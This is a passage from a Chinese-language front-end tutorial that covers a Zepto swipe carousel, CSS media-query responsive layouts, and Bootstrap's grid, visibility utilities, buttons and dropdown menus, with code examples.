<script src="lib/zepto/fx.js"></script>
<!--手势-->
<script src="lib/zepto/touch.js"></script>
<script src="js/index.js"></script>
</body>
</html>
```
>[success] # zepto组件 
```
1.根据定制导入对应的zepto 对应的组件
```
>[danger] ##### 轮播案例
``` 
$(function () {
    /*手势切换轮播图*/
    /*1.自动轮播 无缝*/
    /*2.点随着变化*/
    /*3.完成手势切换*/

    var $banner = $('.sn_banner');
    var width = $banner.width();

    var $imageBox = $banner.find('ul:first');
    var $pointBox = $banner.find('ul:last');
    var $points = $pointBox.find('li');

    var animationFuc = function () {
        /*动画*/
        $imageBox.animate({transform:'translateX('+(-index*width)+'px)'},200,function () {
            /*动画执行完成的回调*/
            if(index >= 9){
                index = 1;
                /*瞬间*/
                $imageBox.css({transform:'translateX('+(-index*width)+'px)'});
            }else if(index <= 0 ){
                index = 8;
                /*瞬间*/
                $imageBox.css({transform:'translateX('+(-index*width)+'px)'});
            }
            /*index  1-8*/
            /*2.点随着变化*/
            $points.removeClass('now').eq(index-1).addClass('now');

        });
    }

    /*1.自动轮播 无缝*/
    var index = 1;
    var timer = setInterval(function () {
        index ++;
        animationFuc();
    },5000);

    /*3.完成手势切换  android 4.0 兼容 */
    /*左滑的手势  下一张*/
    $banner.on('swipeLeft',function () {
        index ++;
        animationFuc();
    });
    /*右滑的手势  上一张*/
    $banner.on('swipeRight',function () {
        index --;
        animationFuc();
    });

});
```
>[success] # 响应式布局
```
1.使用媒体查询能针对不同屏幕区间设置不同的布局和样式
2.怎么使用媒体查询：关于媒体查构造响应式布局案例 -- @media  */
3.语法： @media screen and (max-width: 768px) and (min-width: 320px){属性样式}，注意在 and 周围加空格
```
* 对于媒体屏幕大小的划分
![](https://box.kancloud.cn/84e378a42bd2c25df3ebba582f0706e5_1047x145.png)
```
1.用三个节点来划分屏幕，形成响应式布局效果
```
>[danger] ##### 响应式布局和流动式区别
```
1.响应式是根据屏幕大小通过 @media css 样式进行变化
2.流动式布局是宽度百分百的样式，进行内容自适应的一种布局方案
```
>[danger] ##### 构造响应式布局案例 -- @media 
```
1.将屏幕进行分割后，获得每一个最小值768/992/1200,为了让布局的效果比实际要好，其实内容的版心还会略小于实际布局  
 效果
2.固定----自己设置宽度属相让固定
 * 1170----屏幕>=1200px的宽度
 * 970-----屏幕>=992px宽度
 * 750-----屏幕>=768px宽度
 * auto----768px一下的宽度
3.语法： @media screen and (max-width: 768px) and (min-width: 320px){属性样式},实际就是在不同屏幕下覆盖上一个样式设置，注意在 and 周围加空格
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding:0;
        }
        .container{
            width: 1170px;
            background: pink;
            height: 1000px;
            margin: 0 auto;
        }
        @media screen and (max-width: 768px){
            /*1.设置屏幕最大 的宽度效果768px 时候 div class 样式container
             2.相当于重新覆盖了之前样式的背景和宽
             */
            .container{
                width: 100%;
                background: blue;
            }
        }


        @media screen and (min-width: 768px) and (max-width:992px){
            /*1.中间内容的版心 略小于 最小屏幕的设置
            2.在小屏设备的时候   768px-992px    当前容器的宽度750px    背景绿色
            */
            .container{
                width: 750px;
                background: green;
            }
        }
        @media screen and (min-width: 992px) and (max-width: 1200px){
            /*3. 在中屏设备的时候   992px-1200px   当前容器的宽度970px    背景红色*/
            .container{
                width: 970px;
                background: red;
            }
        }
        @media screen and (min-width: 1200px){
            /*4. 在大屏设备的时候   1200px以上      当前容器的宽度1170px   背景黄色*/
            .container{
                width: 1170px;
                background: yellow;
            }
        }
    </style>
</head>
<body>

<!--
响应式容器：
1. 在超小屏设备的时候 768px以下      当前容器的宽度100%     背景蓝色
2. 在小屏设备的时候   768px-992px    当前容器的宽度750px    背景绿色
3. 在中屏设备的时候   992px-1200px   当前容器的宽度970px    背景红色
4. 在大屏设备的时候   1200px以上      当前容器的宽度1170px   背景黄色
-->
<div class="container"></div>
</body>
</html>
```

>[danger] ##### 响应式的案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding: 0;
        }
        .container{
            width: 100%;
            margin: 0 auto;
            height: 1000px;
            background: blue;
        }


        @media (min-width: 768px) {
            .container{
                width: 750px;
                background: green;
            }
        }

        @media (min-width: 992px) {
            .container{
                width: 970px;
                background: red;
            }
        }

        @media (min-width: 1200px){
            .container{
                width: 1170px;
                background: yellow;
            }
        }


    </style>
</head>
<body>
<!--
响应式容器：
1. 在超小屏设备的时候 768px以下      当前容器的宽度100%     背景蓝色
2. 在小屏设备的时候   768px-992px    当前容器的宽度750px    背景绿色
3. 在中屏设备的时候   992px-1200px   当前容器的宽度970px    背景红色
4. 在大屏设备的时候   1200px以上      当前容器的宽度1170px   背景黄色
-->
<div class="container"></div>
</body>
</html>
```
>[success] # 什么是bootstrap
```
1.Bootstrap，来自 Twitter，是目前很受欢迎的前端框架。Bootstrap 是基于 HTML、CSS、JavaScript 的，它简洁灵活，使得 Web 开发更加快捷。 [1]  它由Twitter的设计师Mark Otto和Jacob Thornton合作开发，是一个CSS/HTML框架。Bootstrap提供了优雅的HTML和CSS规范，它即是由动态CSS语言Less写成。Bootstrap一经推出后颇受欢迎，一直是GitHub上的热门开源项目，包括NASA的MSNBC（微软全国广播公司）的Breaking News都使用了该项目。 [2]  国内一些移动开发者较为熟悉的框架，如WeX5前端开源框架等，也是基于Bootstrap源码进行性能优化而来。 [3] 

```
* * * * *

>[danger] ##### 下载bootstrap

从上到下依次是css 样式，fonts 字体 ，js配合jquery使用
![](https://box.kancloud.cn/fa60457d99b1b65331d3b12a6c82c0f6_206x69.png)

>[danger] ##### 基本模板对应讲解
* 从上到下依次有
```
1.声明h5文档
2.声明文档语言
3.声明文档的编码格式
4.要求当前页面使用浏览器最高版本内核
5.适应手机端设置的视口的设置：视口的宽度和设备一致，默认的缩放比例和PC端一致，用户不能自行缩放
6.Bootstrap 核心样式 css的引入
7.html5shiv 和  respond 分别用来解决IE8版本浏览器不支持 H5标签和媒体查询的  不兼容问题
8. bootstrap依赖jquery
9. bootstrap js 核心文件
```
```
<!--h5文档申明-->
<!DOCTYPE html>
<!--文档语言申明  en zh-CN zh-tw -->
<html lang="zh-CN">
<head>
    <!--文档编码申明-->
    <meta charset="utf-8">
    <!--要求当前网页使用浏览器最高版本的内核来渲染-->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--视口的设置：视口的宽度和设备一致，默认的缩放比例和PC端一致，用户不能自行缩放-->
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
    <!-- 优先加载和浏览器解释 -->

    <title>title</title>

    <!-- Bootstrap 核心样式-->
    <link href="../lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <!-- html5shiv 和  respond 分别用来解决IE8版本浏览器不支持 H5标签和媒体查询的  不兼容问题-->
    <!-- HTML5 shiv and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- 警告：不能以file形式打开，本地打开。最好http://打开 -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!-- 在 IE 9 一下引入-->
    <!--[if lt IE 9]>
    <script src="../lib/html5shiv/html5shiv.min.js"></script>
    <script src="../lib/respond/respond.min.js"></script>
    <![endif]-->
</head>
<body>
<!--TODO-->
<!-- Button trigger modal -->
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
    Launch demo modal
</button>

<!-- Modal -->
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="myModalLabel">Modal title</h4>
            </div>
            <div class="modal-body">
                ...
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Save changes</button>
            </div>
        </div>
    </div>
</div>



<!-- bootstrap依赖jquery-->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="../lib/jquery/jquery.min.js"></script>
<!-- bootstrap js 核心文件-->
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
</html>
```
>[danger] ##### bostrap.css 重置css 使用的是normalize
```
1.创建网页的时候活多或少的需要清除一些标签的自带样式方便我们创建页面例如*{margin:0}
2.我们可以引入两种对css 重置预处理的方式reset.css/normalize.css
3.他们的共同点：都是重置样式库，增强浏览器的表现一致性
4.他们的不同点：
    举个例子：ul
    reset.css   list-style:none ---因为需求
    normalize.css 不会重置ul样式 ---本身已经在每个浏览器表现一致的元素
5.简单一句话：都是增强浏览器的表现一致性但是normalize不会重置已经一致的元素

```
[TOC=1,5]
>[success] # bootstrap 栅格系统
```
1.Bootstrap 提供了一套响应式、移动设备优先的流式栅格系统，随着屏幕或视口（viewport）尺寸的增加，系统会自动分为最多12列
```


>[success] # 容器
```
1.提供了两种容器一种是流式布局，根据百分比布局 --- container-fluid
2.一种是响应式布局利用@media 进行的根据屏幕大小布局方案 --- container
```
>[danger] ##### 容器-container-fluid 流体
```
1.类用于 100% 宽度，占据全部视口（viewport）的容器，无论屏幕大小多少都百分百宽度
```

>[danger] ##### 容器-container 响应式
```
1.类用于固定宽度并支持响应式布局的容器，根据屏幕分辨率来调整宽度,列如下面第二个，当浏览器窗口大于1200px时，在页
 面展示的宽度为1170
具体屏幕划分：
1.固定----自己设置宽度属相让固定
2.1170----屏幕>=1200px的宽度
3.970-----屏幕>=992px宽度
4.750-----屏幕>=768px宽度
5.auto----768px一下的宽度
```
>[danger] ##### row 在两种布局下的效果
![](https://box.kancloud.cn/48857f4b1607f20be2f35e34195bb683_978x249.png)
```
1.row按照行分割，如果在上面两种容器中使用row 都会百分百大小
2.使用自定义的div 就是出现左右15px 的距离
3.row 没有产生左右15是因为，row的cssmargin-left,margin-right -15px拉伸
```
```
    <style>
        .container{
            height: 100px;
            background: pink;
        }
        .container-fluid{
            height: 100px;
            background: hotpink;
        }
        .row{
            background: #1b6d85;
            height: 25px;

        }
        .myRow{
            background: #cccccc;
            height: 25px;

        }
    </style>
</head>
<body>
<!--响应式布局容器-->
<div class="container">
    <div class="row"></div>
    <div class="myRow"></div>
</div>
<!--流式布局容器-->
<div class="container-fluid">
    <div class="row"></div>
    <div class="myRow"></div>
</div>
```

>[danger] ##### 两者的页面展示
* 效果展示 可以看响应式布局详解分析理解

![](https://box.kancloud.cn/5759d1b2783441ad1f34367d2681b1c9_1141x158.png)

* * * * *
* 代码的书写

![](https://box.kancloud.cn/d3d1f91d40b3ae38840f8f3f8c641b87_590x273.png)


>[success] # 分列
```
1.col 样式给通过row 样式包裹，也就是每一行十二列，最好放入上面两种容器中的任意一种
```

>[danger] #####  col- * - *  四种格式/12中型号

```
1.下面四种格式对应四种分辨率所展示的效果，当屏幕分辨率在范围内时，成正常的分割布局，当小于时堆叠排列，xs出外永
 远都是水平排列 --- 列：col-*-*  *不确定（参数）
2.第一个*：屏幕的大小
    大屏设备     lg   大屏设备以上生效包含本身
    中屏设备     md   中屏设备以上生效包含本身
    小屏设备     sm   小屏设备以上生效包含本身
    超小屏设备   xs   超小屏设备以上生效包含本身
3.第二个*：每一行的分等份，默认分成12等份 ，数字代表的是占多少份
```
>[danger] ##### 四种格式
```
1.下面四种格式对应四种分辨率所展示的效果，当屏幕分辨率在范围内时，成正常的分割布局，当小于时堆叠排列，xs出外永 
 远都是水平排列
解释：
1.col-lg-      对应>=1200
2.col-md-      对应>=992
3.col-sm-      对应>=768
4.col-xs-	   对应<=768
```

>[danger] ##### 12中型号
```
十二中型号，是对应最大可分割十二列，当超过12的分列的时候，就会从下一行开始重新将多出来的排列
1.col-lg-1```~12
```
>[danger] ##### 案例
```
下面代码的意思将，一行分成3型号，红分成4份，4*3=12，sty自定义的展示样式
```
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 bg">col-lg-3</div>
        <div class="col-lg-3 bg">col-lg-3</div>
        <div class="col-lg-3 bg">col-lg-3</div>
        <div class="col-lg-3 bg">col-lg-3</div>
    </div>
</div>

```

**效果**
在指定范围
![](https://box.kancloud.cn/c9a2d7a1c439168367adac49e18ac5b6_1387x130.png)
小于指定范围
![](https://box.kancloud.cn/d3dd71da66cab7e4d1b404c0d1b843b6_1030x199.png)

>[danger] 格式组合相同型号案例

![](https://box.kancloud.cn/cf8cd9faec5f187a78f299772ad025ab_855x176.png)
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 col-md-3 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-3 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-3 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-3 bg">col-lg-3</div>
    </div>
</div>
```
**效果**
当屏幕分辨率小于md 时才会重叠排列

* * * * *

>[danger] 格式组合非相同型号案例

![](https://box.kancloud.cn/606af7f82421d7a2ce2a98743d65b638_687x212.png)
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 col-md-4 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-4 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-4 bg">col-lg-3</div>
        <div class="col-lg-3 col-md-4 bg">col-lg-3</div>
    </div>
</div>
```
**效果**
![](https://box.kancloud.cn/04058b6e22c88d866450a81f68c65a16_1051x142.png)

>[danger] ##### 网站案例

**lg**
![](https://box.kancloud.cn/a281e5f399e94b119bc2eb86755dcc51_1209x387.png)

**md**
![](https://box.kancloud.cn/c17ad20b1d8b717eacabeaefca14df59_1064x377.png)

**代码**
![](https://box.kancloud.cn/344f4e42949110019022b503da5eb7f7_904x140.png)


<br>

* * * * *
>[success] # 偏移和排列
```
1.偏移只能向右面偏移，因为列固定向左漂浮，使用偏移 col-[ * ]-offset-*,规定它向右偏移的距离
2.排列可以前后，也就是左右
```
>[danger] ### 偏移 col-[ * ]-offset-*
```
1.控制设定的各自，右面有多少占位
```
>[danger] ##### 当偏移加格子数=12
```
1.作用设置让格子排在中间
```
![](https://box.kancloud.cn/2f84ab3d1062cda7288ef650083b5b20_786x128.png)

![](https://box.kancloud.cn/e03ea6568ef4557a0df697bd9f275890_1269x121.png)

```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 col-lg-offset-9 bg">col-lg-3</div>
    </div>
</div>
```

>[danger] ##### 组合排列时
```
1.当未指定，特殊分辨率占据格子大小，却只制定了偏移的大小，那么盒子的占据的位置等于12-偏移
2.下面未指定md 占据多少，所以根据md的偏移。md占据八个
```
![](https://box.kancloud.cn/257a6c936141296e2b878720f4f897fc_842x124.png)

**上面的代码当lg展示：**
![](https://box.kancloud.cn/17ed84297856ff4e0d3e38b88b9a39d5_1252x119.png)
**上面的代码当md展示：**
![](https://box.kancloud.cn/9d4a6f196461c463e689a0b888770b85_1097x125.png)

<br>

* * * * *

>[danger] ### 排序 .col-md-push-* 和 .col-md-pull-* 
```
1.push 右，pull左
2.push 往后推 / pull 往前拉
```
>[danger] ##### push 和pull案例
![](https://box.kancloud.cn/c6cc1bcd42d4b1ef3fa259af78fc5f96_716x132.png)

* * * * *
![](https://box.kancloud.cn/45a02d54b8ac53348155aee0b7d4a7d5_1294x136.png)




>[danger] ##### offset 和 push/pull 不同点

1.offset 只能向右，push和pull可以组合产生
2.当多行加偏移超过12时，会产生如图效果
![](https://box.kancloud.cn/9962da15ed244e44e7bcad48b26c68b5_1335x150.png)

```
<div class="container sty">
    <div class="row">
        <div class="col-lg-2 bg">col-lg-2</div>
        <div class="col-lg-2 col-lg-push-9 bg">col-lg-2</div>
    </div>

    <div class="row">
        <div class="col-lg-2 bg">col-lg-2</div>
        <div class="col-lg-2 col-lg-offset-9 bg">col-lg-2</div>
    </div>
</div>
```

>[danger]  ##### 一列可以嵌套12列

```
<div class="container sty">
    <div class="row">
        <div class="col-lg-2 bg">
            <div class="col-lg-3 bg">aa</div>
        </div>
    </div>
</div>
```
>[success] # 隐藏显示
* 原理
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        @media screen and (min-width: 1200px){
            .box{
                display: block;
            }
        }
        @media screen and (min-width: 992px) and (max-width: 1200px){
            .box{
                display: none;
            }
        }
        @media screen and (min-width: 768px) and (max-width: 992px){
            .box{
                display: block;
            }
        }
        @media screen and (max-width: 768px){
            .box{
                display: none;
            }
        }
    </style>
</head>
<body>
<!--
大屏设备    显示
中屏设备    隐藏
小屏设备    显示
超小屏设备  隐藏
-->
<div class="box">内容</div>
</body>
</html>
```

* 在boots 中使用
```
    <style>
        .container{
            height: 100px;
            background: pink;
        }
        .container-fluid{
            height: 100px;
            background: hotpink;
        }
    </style>
</head>
<body>
<!--
大屏设备    显示
中屏设备    隐藏
小屏设备    显示
超小屏设备  隐藏
visible-lg     大屏显示其他隐藏
visible-md
visible-sm
visible-xs
3.2版本以后  建议使用hidden
hidden-lg
hidden-md
hidden-sm
hidden-xs
-->
<!--<div class="box visible-lg visible-sm">内容</div>-->
<div class="box hidden-md hidden-xs">内容</div>
<!-- bootstrap依赖jquery-->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="../lib/jquery/jquery.min.js"></script>
<!-- bootstrap js 核心文件-->
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="../lib/bootstrap/js/bootstrap.min.js"></script>
</body>
```
>[success] # 清除浮动  `<div class="clearfix"></div>`

![](https://box.kancloud.cn/922c7fb908fb66a4f8f7ee344213341a_1258x208.png)
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-2 bg">
            <p>1223</p>
            <p>1223</p>
            <p>1223</p>
            <p>1223</p>
        </div>
        <div class="col-lg-10 bg">
            123
        </div>
        <div class="col-lg-10 bg">
            123
        </div>
    </div>
</div>
```

**clearfix:**
![](https://box.kancloud.cn/8421b913a02025c665d2b14217a6cc35_1238x190.png)


* * * * *

![](https://box.kancloud.cn/4c2b36486e7557379c75ceeb394826c4_622x345.png)

>[success] # 响应式工具

>针对不同设备展示或隐藏内容

>[danger] ##### 用法

```
显示
visible-*-*
	》lg md sm xs
    》block inline inline-block
隐藏
hidden-*
	》lg md sm xs
```

* * * * *

>[danger] ##### 代码示例

当属性不是指定的型号的时候会隐藏掉-visible

![](https://box.kancloud.cn/37335cc2e7945f8f229deb3bd329a879_1242x126.png)
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 visible-lg-block bg">aaaaa</div>
    </div>
</div>
```

当属性是指定型号时会隐藏-hidden
```
<div class="container sty">
    <div class="row">
        <div class="col-lg-3 hidden-lg bg">aaaaa</div>
    </div>
</div>

```

![](https://box.kancloud.cn/ec501bb60dd36cc9d36751de7c693b87_1265x82.png)

也可以多个属性同时使用
>[success] # 通过屏幕大小控制菜单显示


* * * * *

>[danger] ##### 知识点
```
1.visible     -*-*  控制显示
2.container   当用容器时，想去掉内边距，
			  有两种方法第一种容器中包含row，可以去掉内边距，
              第二种不放在容器中
3.pull-right/left  控制左右浮动
4.affix    	  固定定位，
              相对浏览器的位置固定不变的position：fixed
```


* * * * *

>[danger] ##### 代码

```
<div class="container-fluid sty">
    <div class="row">
       <div class="col-lg-1 pull-right visible-lg-block" style="height: 280px;background: black"></div>
       <div class="col-lg-1 pull-right hidden-lg" style="height: 280px;background: blue"></div>
    </div>
</div>
```

![](https://box.kancloud.cn/e43bb6531a481c039fccb3f326c281e2_970x136.png)

**效果**
![](https://box.kancloud.cn/1dd490e2d7be39733a36dc835823e30e_233x349.png)
![](https://box.kancloud.cn/eb9058fe67361def2f480c751dc6aa41_117x322.png)

>[danger] ##### 上面的问题

第一点col 都是块级元素首先户独占一行，一般菜单都是固定的
解决办法，使用固定定位，affix这样fixed会让块级元素拖表从而浮动，根据right left 在浏览器定位即可
![](https://box.kancloud.cn/6da3c741fa4b281a324284cb4744223e_1030x154.png)
[TOC=1,5]
>[success] # 预定义风格

```
1.primary  （首选项）    --蓝色
2.success  （成功）      --绿色
3.info     （一般信息）  --浅蓝色
4.warning  （警告）      --橘色
5.danger   （危险）      --红色
```


* * * * *
<br>

>[danger] ##### 按钮样式

定义按钮的时候先使用btn 定义 样式，然后再结合预定义选择颜色,按钮样式不局限在input 标签中

![](https://box.kancloud.cn/5bb523e7e6c7e20f9bdc43d868649385_471x33.png)
```
<div class="container-fluid">
    <input type="button" value="普通">
    <input type="button"  value="常规" class="btn">
    <input type="button" value="首选项" class="btn btn-primary">
    <input type="button" value="成功" class="btn btn-success">
    <input type="button" value="一般信息" class="btn btn-info">
    <input type="button" value="警告" class="btn btn-warning">
    <input type="button" value="危险" class="btn btn-danger">
</div>
```

* * * * *
<br>

>[danger] ##### 背景颜色-bg-*

```
<div class="bg-primary">普通</div>
<div class="bg-success">成功</div>
<div class="bg-info">一般信息</div>
<div class="bg-warning">警告</div>
<div class="bg-danger">危险</div>
```
![](https://box.kancloud.cn/d0c646319b7cddc2d80c4ec0e4372451_1404x129.png)

* * * * *

<br>

>[danger] ##### 文字颜色-text-*

![](https://box.kancloud.cn/74cb3c08e556d52a946da4c3859a3484_387x84.png)
```
 	<a href="#" class="text-primary">普通</a>
    <a href="" class="text-success">成功</a>
    <a href="" class="text-info">一般信息</a>
    <a href="" class="text-warning">警告</a>
    <a href="" class="text-danger">危险</a>
```

>[danger] ##### 警告框 alert alert-*

![](https://box.kancloud.cn/822229d0a8d7332599d8a1518a450d7b_1362x314.png)
```
    <div class="alert alert-success">成功</div>
    <div class="alert alert-info">一般信息</div>
    <div class="alert alert-warning">警告</div>
    <div class="alert alert-danger">危险</div>
```


* * * * *

<br>

>[danger] ##### 面板model-panel panel-*

>可以定义最外层的div宽度

![](https://box.kancloud.cn/dcfb7ce6dcea65a7b30c8cce3b8f1fdc_241x123.png)
```
<div class="panel panel-danger">
        <div class="panel-heading">标题</div>
        <div class="panel-body">内容</div>
    </div>
```
>[success] # 登录案例

>[danger] ##### 展示效果

![](https://box.kancloud.cn/4155f9f7d5c2e89c78ad0280acbdd42d_318x311.png)


* * * * *
>[danger] ##### 代码

![](https://box.kancloud.cn/b94a785d8a0978506780f9ec6cd8348c_636x288.png)
```
<div id="login" class="panel panel-primary">
        <div class="panel-heading">登陆</div>
        <div class="panel-body">
            <div class="form-group">
                <label>用户</label>
                <input type="text" class="form-control">
                <div class="alert alert-danger">用户名错误</div>
                <label>密码</label>
                <input type="text" class="form-control">
                <a href="#" class="text-info">忘记密码？</a>
                <a class="btn btn-info pull-right" >登陆</a>
            </div>
        </div>
    </div>
```
[TOC=1,5]
>[success] # 按钮样式

```
基类
	-btn
样式
	-btn-default（默认）
    -btn-link   （连接）
大小
	-btn-*[lg，sm，xs]
状态
	-active
    -disabled
种类
    - a, input, button
块级
    -btn-block 讲行内块转成块，宽度继承父类
```

* * * * *
<br>


>[danger] ##### 基类btn

![](https://box.kancloud.cn/9a28499b7a248abe61a44912c3e353a4_325x85.png)

* * * * *

```
    <input type="button" value="btn" class="btn">
    <input type="button" value="btn-default" class="btn btn-default">
    <input type="button" value="btn-link" class="btn btn-link">
```

* * * * *
<br>


>[danger] ##### btn大小

高度不一样
![](https://box.kancloud.cn/cde2ee6d97df5fe551760c24283d1f71_306x88.png)
```
    <input type="button" value="默认大小" class="btn btn-info">
    <input type="button" value="lg大小" class="btn btn-info btn-lg">
    <input type="button" value="sm大小" class="btn btn-info btn-sm">
    <input type="button" value="xs大小" class="btn btn-info btn-xs">
```



* * * * *

>[danger] ##### 状态-active

![](https://box.kancloud.cn/fe0c4ec0e5ed3fca43701b3c922dd697_274x103.png)
```
    <input type="button" value="active" class="btn btn-info active">
    <input type="button" value="没加active" class="btn btn-info">
```

>[danger] ##### 禁用-disabled


* * * * *



![](https://box.kancloud.cn/f24cbc6a2156aa065a31f7193a018620_119x53.png)
```
  <input type="button" value="没加active" class="btn btn-info disabled">
```



* * * * *

<br>

>[success] # 按钮组
 
 让按钮之间紧密排列
 
```
-btn-group
-btn-group-justified
-btn-group-vertical
```



* * * * *


>[danger] ##### 横向分组-btn-group

用div 包裹要分组的input

![](https://box.kancloud.cn/6cdb54f95390cbc4e60d6da6d417e9cc_519x104.png)

```
<!--没分组的-->
    <div>
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
    </div>

    <!--分组的-->
    <div class="btn-group">
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
    </div>
```


* * * * *
>[danger] ##### btn-group-justified 根据父级调整宽度

要注意 直接a标签可以使用，但input和button 给在分组

![](https://box.kancloud.cn/8d4ba5a1f5c57bff85fd3cd765f69a43_1346x166.png)

**a标签使用**
```
 <div class="btn-group-justified">
        <a type="button"  class="btn btn-info">点击</a>
        <a type="button"  class="btn btn-info">点击</a>
        <a type="button"  class="btn btn-info">点击</a>
    </div>
```

**其他标签使用**
```

    <div class="btn-group-justified">
        <div class="btn-group">
            <input type="button" value="点击" class="btn btn-info ">
        </div>
        <div class="btn-group">
            <input type="button" value="点击" class="btn btn-info ">
        </div>
        <div class="btn-group">
            <input type="button" value="点击" class="btn btn-info ">
        </div>

    </div>
```


* * * * *
>[danger] ##### 竖向分组-btn-group-vertical



![](https://box.kancloud.cn/b49614dd064debc89623c6cb596c9d58_146x112.png)
![](https://box.kancloud.cn/81c7cecd37236763b8b2c06db6c3946b_672x260.png)

```
 <div class="btn-group-vertical btn-group-xs">
        <a type="button"  class="btn btn-info">点击</a>
        <a type="button"  class="btn btn-info">点击</a>
        <a type="button"  class="btn btn-info">点击</a>
    </div>

    <div class="btn-group-vertical">
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
        <input type="button" value="点击" class="btn btn-info ">
    </div>

```


* * * * *


>[success] # 按钮图片组合-caret倒三角

这种情况只适用于a和button ，input不推荐

>[danger] ##### 效果

![](https://box.kancloud.cn/51f441d204a20d7a0498559f5bee7679_285x70.png)

>[danger] ##### 代码

```
<a type="button"  class="btn btn-info"> a点击 <span class="caret"></span></a>
<button class="btn btn-info">button点击<span class="caret"></span></button>
<input type="button" value="input点击"  class="btn btn-info"><span class="caret"></span>

```

>[success] # 按钮图片分组-caret倒三角


>[danger] ##### 使用

![](https://box.kancloud.cn/4ac50436df1acb5b0377aa2138988f82_115x62.png)
```
<div class="btn-group">
     <a class="btn btn-info"> a点击 </a>
     <a class="btn btn-info"> <span class="caret"></span></a>
 </div>
```

**箭头向上**
![](https://box.kancloud.cn/9d7254d52c17cd48217066555b1cc263_113x81.png)
![](https://box.kancloud.cn/27a7b5348c7d48d57d2d20d81ed17426_742x106.png)
>[success] # 下拉菜单
![](https://box.kancloud.cn/0ab7092e785e89e42c3458235bf1484b_201x183.png)

**自定制宽度**
![](https://box.kancloud.cn/b8015da12474d76feffc20272d7e48e6_596x146.png)

>[danger] ##### 属性

```
-dropup    向上菜单 作用在最外层的包裹的div上
-dropdown  向下菜单
- data-*   触发js 交互
- aria-*   方便特殊人群，触发特殊人群阅读器
- role     方便特殊人群，触发特殊人群阅读器

- dropdown-menu-right 控制菜单向右
- dropdown-header     菜单头
- divider             菜单分割线
- li 上加text-center  菜单文本居中
```



* * * * *

>[danger] ##### 代码案例

![](https://box.kancloud.cn/6b4ec27d8ebd94326334a1d96710199e_1014x322.png)


* * * * *

```
<div class="container-fluid">
        <div class="dropdown">
            <button class="btn btn-default dropdown-toggle" type="button" data-toggle="dropdown" >
            Dropdown
            <span class="caret"></span>
        </button>
        <ul class="dropdown-menu">
            <li><a href="#">Action</a></li>
            <li><a href="#">Another action</a></li>
            <li><a href="#">Something else here</a></li>
            <li class="divider"></li>
            <li><a href="#">Separated link</a></li>
        </ul>
    </div>

</div>

```

>[danger] 下拉菜单按钮有浮动

![](https://box.kancloud.cn/f5a84f29ac16272a79d4e618558084e4_407x217.png)

![](https://box.kancloud.cn/55d16f08e36d7f4fba02ca37a59d58e0_852x244.png)

```
        <div class="dropdown pull-right">
        <button class="btn btn-default  dropdown-toggle" type="button" data-toggle="dropdown" >
            Dropdown
            <span class="caret"></span>
        </button>
        <ul class="dropdown-menu dropdown-menu-right">
            <li><a href="#">Action</a></li>
            <li><a href="#">Another action</a></li>
            <li><a href="#">Something else here</a></li>
            <li class="divider"></li>
            <li><a href="#">Separated link</a></li>
        </ul>
    </div>

```



* * * * *


>[danger] ##### 设置菜单头和分割线


* * * * *


![](https://box.kancloud.cn/39f1f01bb2ab49187e3a102be6416fcd_621x228.png)

* * * * *


![](https://box.kancloud.cn/380cd6f838ebadce89ff7fa7b2ba6377_484x264.png)
>[success]  # 延迟下拉

>[danger] ###### css

```

       .my-btnStyle button{
           width: 85px;
           height: 50px;
           border: none;
           background: #E1E1E1;
       }
       .my-btnStyle .dropdown-menu{ animation:.3s linear fadeIn;}
       @keyframes fadeIn{
           0%{ opacity:0; transform:translateY(-20px);}
           100%{ opacity:1; transform:translateY(0px);}
       }
```

>[danger] ##### html

```
<div class="container-fluid my-btnStyle">
    <div class="dropdown">
        <button class="btn btn-default dropdown-toggle" type="button" data-toggle="dropdown">
            点击
            <span class="caret"></span>
        </button>
        <ul class="dropdown-menu">
            <li><a>1111</a></li>
            <li><a>1111</a></li>
            <li><a>1111</a></li>
            <li><a>1111</a></li>
        </ul>

    </div>

</div>

```
>[danger] ##### js写法

html 接上一篇
```
    if( window.navigator.userAgent.toLowerCase().indexOf('mobile')==-1){
        /*$('.dropdown-toggle').on('mouseover',function(){
            alert(1);
        });*/
        var timer = null;
